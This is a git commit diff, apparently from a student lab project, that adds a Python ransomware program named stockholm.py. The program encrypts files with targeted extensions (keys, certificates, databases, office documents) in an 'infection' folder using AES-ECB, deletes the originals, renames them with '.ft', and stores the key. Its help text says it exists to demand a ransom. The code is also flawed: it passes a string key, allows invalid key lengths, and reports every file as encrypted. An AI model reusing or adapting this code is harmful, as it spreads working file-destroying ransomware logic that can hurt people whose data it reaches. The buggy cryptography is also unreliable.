2ef10b1fded7dbb133452bde6decd28e77ccc1cb
ccardozom <carloscardozom@gmail.com>
2023-05-30 07:57:17 +0200

    se añaden las funciones de encriptar y desencriptar

--- stockholm.py
+++ stockholm.py
@@ -1,7 +1,9 @@
-from cryptography.fernet import Fernet
-import sys, os
 import os
 import argparse
+import argparse
+import string
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
 
 extensiones = [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
                 ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
@@ -14,24 +16,100 @@ extensiones = [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", "
                 ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"] #
 
 
-#url_root = https://www.42madrid.com
 
-parser = argparse.ArgumentParser(description="Encriptar ficheros para pedir rescate !!Con dos cojones¡¡")
-parser.add_argument("key", help="key para encriptar los ficheros")
-parser.add_argument("-r", "--reverse", dest="reverse", action="store_true", help="Desencripta los ficheros utilizando la key.")
-parser.add_argument("-s", "--silence", dest="silence", action="store_true", help="Silenciar los eventos de encriptado y desencriptado.")
-parser.add_argument("-v", "--version", dest="version", action="store_true", help="version del programa")
+def encrypt_file(file_path, key):
+    with open(file_path, 'rb') as file:
+        data = file.read()
+    cipher = AES.new(key, AES.MODE_ECB)
+    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
+    encrypted_file_path = file_path + '.ft'
+    with open(encrypted_file_path, 'wb') as encrypted_file:
+        encrypted_file.write(encrypted_data)
+    os.remove(file_path)
 
-params = parser.parse_args()
+
+def encrypt_directory(directory_path, key, silent=False):
+    for root, subdir, files in os.walk(directory_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            extension = os.path.splitext(file_path)[1].lower()
+            if extension in extensiones:
+                encrypt_file(file_path, key)
+            if not silent:
+                print(f"Encrypted: {file_path}")
 
 
-extension = ".ft"
+def decrypt_file(file_path, key):
+    with open(file_path, 'rb') as file:
+        data = file.read()
+    cipher = AES.new(key, AES.MODE_ECB)
+    decrypted_data = unpad(cipher.decrypt(data), AES.block_size)
+    decrypted_file_path = file_path[:-3]
+    with open(decrypted_file_path, 'wb') as decrypted_file:
+        decrypted_file.write(decrypted_data)
+    os.remove(file_path)
 
-if __name__ == "__main__":
-    path_to_encrypt = os.getcwd() + "/infection"
-    try:
-       # items = os.listdir(path_to_encrypt)
-        print(path_to_encrypt)            
-    except:
-        print ("No se encontraron ficheros para encryptar")
- 
+
+def decrypt_directory(directory_path, key, silent=False):
+    for root, subdir, files in os.walk(directory_path):
+        for file in files:
+            if file.endswith('.ft'):
+                file_path = os.path.join(root, file)
+                decrypt_file(file_path, key)
+                if not silent:
+                    print(f"Decrypted: {file_path}")
+
+
+def encrypt_infection_directory(directory_path, key, silent=False):
+    if not silent:
+        print("Encrypting files...")
+    encrypt_directory(directory_path, key, silent)
+    if not silent:
+        print("Encryption completed.")
+
+
+def decrypt_infection_directory(directory_path, key, silent=False):
+    if not silent:
+        print("Decrypting files...")
+    decrypt_directory(directory_path, key, silent)
+    if not silent:
+        print("Decryption completed.")
+
+
+def get_program_version():
+    return "Version 1.0"
+
+def save_key_to_file(key):
+    with open('keys.txt', 'a') as file:
+        file.write(key + '\n')
+
+def main():
+    parser = argparse.ArgumentParser(description='Programa para infectar archivos de un directorio y encriptarlos. Pedir rescate con 2 cojones!!')
+    parser.add_argument('-s', '--silent', action='store_true', help='Ejecuta el programa en modo silencioso')
+    parser.add_argument('-r', '--decrypt', action='store_true', help='Desencripta los archivos infectados')
+    parser.add_argument('-v', '--version', action='store_true', help='Muestra la version del programa')
+    parser.add_argument('key', nargs='?', type=str, default='', help='clave de encriptado (tiene que tener más de 16 caracteres)')
+    args = parser.parse_args()
+
+    if args.version:
+        print(get_program_version())
+        return
+    if not args.key:
+        print('Error: La clave de encriptado es necesaria.')
+        return
+    if len(args.key) < 16:
+        print('Error: La clave de encriptado tiene que tener como minimo 16 caracteres.')
+        return
+    if any(char not in string.printable for char in args.key):
+        print('Error: La clave de encriptado contiene caracteres no permitidos.')
+        return
+    if not args.decrypt:
+        encrypt_infection_directory('infection', args.key, args.silent)
+        save_key_to_file(args.key)
+    else:
+        decrypt_infection_directory('infection', args.key, args.silent)
+
+
+
+if __name__ == '__main__':
+    main()
